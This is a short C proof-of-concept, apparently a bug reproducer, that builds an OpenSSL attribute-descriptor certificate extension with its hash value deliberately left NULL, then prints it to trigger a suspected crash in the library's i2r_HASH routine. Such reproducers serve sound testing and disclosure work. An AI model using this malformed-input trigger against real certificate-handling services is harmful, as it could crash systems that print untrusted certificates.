#include <stdio.h>
#include <string.h>
#include <openssl/x509v3.h>
#include <openssl/asn1.h>
#include <openssl/bio.h>
#include <openssl/obj_mac.h>
#include <openssl/err.h>
#include <openssl/crypto.h>

int main(void) {
    OSSL_HASH *hash;
    OSSL_INFO_SYNTAX_POINTER *pointer;
    OSSL_INFO_SYNTAX *info;
    OSSL_PRIVILEGE_POLICY_ID *ppid;
    OSSL_ATTRIBUTE_DESCRIPTOR *ad;
    X509_ALGOR *alg;
    unsigned char *der = NULL;
    int derlen;
    X509_EXTENSION *ext;
    ASN1_OCTET_STRING *extval;
    BIO *bio;

    /* Build OSSL_HASH with hashValue deliberately left NULL (OPTIONAL, omitted) */
    hash = (OSSL_HASH *)OPENSSL_zalloc(sizeof(*hash));
    alg = X509_ALGOR_new();
    X509_ALGOR_set0(alg, OBJ_txt2obj("1.2.3.4.5", 1), V_ASN1_UNDEF, NULL);
    hash->algorithmIdentifier = alg;
    hash->hashValue = NULL; /* the omitted optional field */

    pointer = (OSSL_INFO_SYNTAX_POINTER *)OPENSSL_zalloc(sizeof(*pointer));
    pointer->name = sk_GENERAL_NAME_new_null();
    pointer->hash = hash;

    info = (OSSL_INFO_SYNTAX *)OPENSSL_zalloc(sizeof(*info));
    info->type = OSSL_INFO_SYNTAX_TYPE_POINTER;
    info->choice.pointer = pointer;

    ppid = (OSSL_PRIVILEGE_POLICY_ID *)OPENSSL_zalloc(sizeof(*ppid));
    ppid->privilegePolicy = OBJ_txt2obj("1.2.3.4.6", 1);
    ppid->privPolSyntax = info;

    ad = (OSSL_ATTRIBUTE_DESCRIPTOR *)OPENSSL_zalloc(sizeof(*ad));
    ad->identifier = OBJ_txt2obj("1.2.3.4.7", 1);
    ad->attributeSyntax = ASN1_OCTET_STRING_new();
    ASN1_STRING_set(ad->attributeSyntax, "syn", 3);
    ad->name = NULL;
    ad->description = NULL;
    ad->dominationRule = ppid;

    derlen = i2d_OSSL_ATTRIBUTE_DESCRIPTOR(ad, &der);
    if (derlen <= 0) {
        fprintf(stderr, "i2d failed\n");
        return 2;
    }
    fprintf(stderr, "encoded %d bytes\n", derlen);

    extval = ASN1_OCTET_STRING_new();
    ASN1_OCTET_STRING_set(extval, der, derlen);
    OPENSSL_free(der);

    ext = X509_EXTENSION_create_by_NID(NULL, NID_attribute_descriptor, 0, extval);
    if (ext == NULL) {
        fprintf(stderr, "ext create failed\n");
        ERR_print_errors_fp(stderr);
        return 3;
    }

    bio = BIO_new_fp(stdout, BIO_NOCLOSE);
    fprintf(stderr, "about to print extension (triggers i2r_HASH)\n");
    fflush(stderr);
    X509V3_EXT_print(bio, ext, 0, 0);
    BIO_flush(bio);
    fprintf(stderr, "print done, no crash\n");
    BIO_free(bio);

    /* clean up to avoid leak-detector noise unrelated to the target bug */
    ASN1_OCTET_STRING_free(extval);
    X509_EXTENSION_free(ext);
    OSSL_ATTRIBUTE_DESCRIPTOR_free(ad);

    return 0;
}
